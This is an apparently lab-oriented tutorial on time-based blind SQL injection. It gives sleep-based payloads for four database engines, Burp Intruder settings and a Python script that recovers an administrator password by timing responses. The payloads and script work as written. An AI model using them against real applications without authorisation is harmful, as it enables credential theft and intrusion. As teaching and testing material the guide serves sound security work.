# Time-Based Blind SQL Injection

## When this applies

- No visible response difference between true/false conditions (no boolean oracle).
- No errors leaked; UNION not feasible.
- Application waits synchronously for the database — measurable timing changes are observable in HTTP response time.

## Technique

Inject a `SLEEP`/`pg_sleep`/`WAITFOR DELAY` inside a `CASE` expression that fires only when the probed condition is true. The HTTP response time becomes the boolean oracle.

## Steps

### 1. Confirm timing oracle

**PostgreSQL:**
```sql
'; SELECT pg_sleep(10)--
'||(SELECT pg_sleep(10))--
```

**MySQL:**
```sql
'; SELECT SLEEP(10)#
'||(SELECT SLEEP(10))#
```

**Microsoft SQL Server:**
```sql
'; WAITFOR DELAY '0:0:10'--
```

**Oracle:**
```sql
'||(SELECT dbms_pipe.receive_message('a',10) FROM dual)||'
```

If the response takes ~10s longer with the payload than without, the timing oracle works.

### 2. Build conditional delay

**PostgreSQL:**
```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

First payload: ~10s delay. Second: no delay.

**MySQL:**
```sql
' AND IF(1=1,SLEEP(10),0)#
```

**Microsoft SQL Server:**
```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

**Oracle:**
```sql
'||(SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual)||'
```

### 3. Probe a real condition

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

### 4. Determine length

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

### 5. Extract characters

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

### CRITICAL Burp Intruder configuration

1. **Resource Pool**: create a new pool with **Maximum concurrent requests = 1**. Concurrency destroys timing accuracy.
2. **Attack type**: Sniper, payloads `a-z 0-9`.
3. **Sort by**: "Response received" column. Correct char ≈ 10,000 ms; incorrect ≈ 100–500 ms.
4. **Iterate**: increment the `SUBSTRING(password,N,1)` offset N from 1 to length.

### Python alternative

```python
import requests, time, string

url = "https://target.example/"
password = ""
for position in range(1, 21):
    for char in string.ascii_lowercase + string.digits:
        payload = (
            f"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+"
            f"SUBSTRING(password,{position},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
        )
        cookies = {"TrackingId": payload}
        start = time.time()
        requests.get(url, cookies=cookies)
        elapsed = time.time() - start
        if elapsed > 9:
            password += char
            print(f"Position {position}: {char}")
            break
print(f"Password: {password}")
```

## Verifying success

- True payload response time ≈ chosen sleep duration; false payload ≈ baseline.
- Recovered password authenticates successfully.
- Re-running the same payload twice yields consistent timings (±200 ms).

## Common pitfalls

- Concurrent requests destroy timing — single-threaded resource pool is mandatory.
- Network jitter at long distances inflates baseline; pick `pg_sleep(10)` not `pg_sleep(2)` and use the median of several runs.
- `SLEEP()` inside `WHERE` may run only once per query (MySQL optimizer); prefer `IF()` / `CASE` with stacked queries when supported.
- Some platforms (PHP-FPM) buffer responses — confirm raw socket time, not browser timing.
- Oracle `dbms_pipe.receive_message('a',N)` requires execute privilege; if denied, fall back to `DBMS_LOCK.SLEEP()` (sysdba only) or out-of-band.

## Tools

- Burp Intruder (single-thread resource pool, sort by response time).
- sqlmap (`--technique=T`).
- Custom Python `requests` with `time.time()` deltas.
